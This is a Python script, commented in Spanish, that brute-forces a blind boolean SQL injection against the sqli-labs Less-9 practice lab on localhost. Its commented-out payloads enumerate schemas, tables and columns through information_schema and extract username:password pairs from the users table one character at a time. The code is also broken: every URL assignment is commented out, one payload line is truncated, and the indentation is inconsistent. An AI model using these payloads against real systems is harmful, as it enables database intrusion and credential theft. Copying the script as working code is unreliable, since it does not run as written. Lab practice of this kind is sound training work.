#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *


def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

main_url= "http://localhost/sqli-labs-php7/Less-9/"
characters=string.printable

def makeSQLI():
    p1= log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)    

    p2=log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1, 250):
        for character in range(33,126):
#            sqli_url = main_url + "?id=22 or (select(select ascii(substring((select group_concat(username,0x3a,password) from security.users),%d,1)) from security.users where id = 1)=%d)" % (position,character)
#            sqli_url = main_url + "?id=1' and ascii(substring(database(), %d, 1))=%d --+" % (position, charac
#  Esto para la base de datos   
#                        sqli_url= main_url + "?id=1' and ascii(substring((select schema_name from information_schema.schemata where schema_name='security'),%d,1))=%d-- -" % (position,character)
#  Esto para las tablas
#                        sqli_url=main_url + "?id=1' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema='security'),%d,1))=%d-- -" % (position,character)
#  Esto para las columnas  
#                        sqli_url=main_url + "?id=1' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),%d,1))=%d-- -" % (position,character)
#                        sqli_url=main_url + "?id=1' and ascii(substring((select group_concat(username,0x3a,password) from security.users),%d,1))=%d-- -" % (position,character)
                        p1.status(sqli_url)
                        r=requests.get(sqli_url)

#            if r.status_code == 200:
#                extracted_info += chr(character)
#                p2.status(extracted_info)
#                break

                        if r.status_code == 200 and "You are in" in r.text:
                            extracted_info += chr(character)
                            p2.status(extracted_info)
                            break


if  __name__=='__main__':
    makeSQLI()



